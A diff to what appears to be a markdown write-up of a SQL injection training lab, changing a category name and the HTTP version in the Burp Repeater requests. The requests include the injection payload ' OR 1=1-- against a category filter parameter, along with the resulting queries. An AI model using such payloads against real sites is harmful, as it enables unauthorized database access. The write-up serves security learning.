@@ -43,7 +43,7 @@ Accessed the lab environment and navigated to the shopping page to analyze appli
 - Shoes & Accessories
 - Corporate Gifts
 - Lifestyle
-- Pens
+- Pets
 
 **Request Captured:**
 ```http
@@ -74,7 +74,7 @@ Sent the request to Burp Repeater to test parameter behavior and confirm SQL que
 
 **Test Payload:** Modified category to non-existent value
 ```http
-GET /filter?category=Pets HTTP/1.1
+GET /filter?category=Pets HTTP/2
 ```
 
 <img width="1920" height="982" alt="LAB1_ss2" src="https://github.com/user-attachments/assets/a03ea5cb-b7dc-470d-9c71-ef481a9e24a5" />
@@ -91,7 +91,7 @@ GET /filter?category=Pets HTTP/1.1
 
 **Test Payload:** Single quote character
 ```http
-GET /filter?category=' HTTP/1.1
+GET /filter?category=' HTTP/2
 ```
 <img width="1920" height="982" alt="LAB1_ss3" src="https://github.com/user-attachments/assets/fb7df5e5-4228-4bff-8481-146077c07aee" />
 
@@ -113,7 +113,7 @@ SELECT * FROM products WHERE category = '''
 
 **Test Payload:** SQL comment sequence
 ```http
-GET /filter?category=-- HTTP/1.1
+GET /filter?category=-- HTTP/2
 ```
 <img width="1920" height="982" alt="LAB1_ss4" src="https://github.com/user-attachments/assets/bd322b40-07aa-490c-a9df-2c335b53eb11" />
 
@@ -133,7 +133,7 @@ SELECT * FROM products WHERE category = '--'
 
 **Attack Payload:** Boolean-based SQL injection
 ```http
-GET /filter?category=' OR 1=1-- HTTP/1.1
+GET /filter?category=' OR 1=1-- HTTP/2
 ```
 <img width="1920" height="982" alt="LAB1_ss5" src="https://github.com/user-attachments/assets/67a7f710-3f75-41b9-a6fc-b8186eb98405" />
 
